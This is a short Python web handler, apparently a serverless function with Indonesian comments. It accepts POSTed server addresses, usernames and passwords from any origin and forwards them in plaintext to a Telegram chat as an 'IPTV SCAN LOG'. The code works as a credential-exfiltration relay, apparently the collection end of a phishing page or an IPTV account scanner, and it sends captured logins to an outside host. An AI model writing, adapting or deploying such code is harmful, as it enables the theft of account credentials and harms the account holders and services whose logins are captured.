import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def kirim_ke_telegram(token, chat_id, pesan):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": pesan}
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read().decode('utf-8')

class handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        token   = os.environ.get('TELEGRAM_BOT_TOKEN', '')
        chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')

        # Baca body
        try:
            length   = int(self.headers.get('Content-Length') or 0)
            raw      = self.rfile.read(length).decode('utf-8') if length > 0 else ''
            data     = json.loads(raw) if raw else {}
            server   = data.get('server',   data.get('host',   '-'))
            username = data.get('username', data.get('user',   '-'))
            password = data.get('password', data.get('pass',   data.get('passwd', '-')))
        except Exception as e:
            server = username = password = '-'
            raw = f'(parse error: {e})'

        # Susun pesan
        waktu = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        pesan = (
            f"IPTV SCAN LOG\n\n"
            f"Server   : {server}\n"
            f"Username : {username}\n"
            f"Password : {password}\n"
            f"Waktu    : {waktu} WIB"
        )

        # Kirim ke Telegram SEBELUM send_response
        tg_status = 'skip'
        if token and chat_id:
            try:
                hasil = kirim_ke_telegram(token, chat_id, pesan)
                tg_status = 'ok'
                print(f"TG OK: {hasil[:80]}")
            except Exception as e:
                tg_status = f'error: {e}'
                print(f"TG GAGAL: {e}")
        else:
            print(f"TG SKIP: token={bool(token)} chat_id={bool(chat_id)}")

        # Baru kirim response ke browser
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "ok",
            "tg": tg_status
        }).encode('utf-8'))
        # v4 
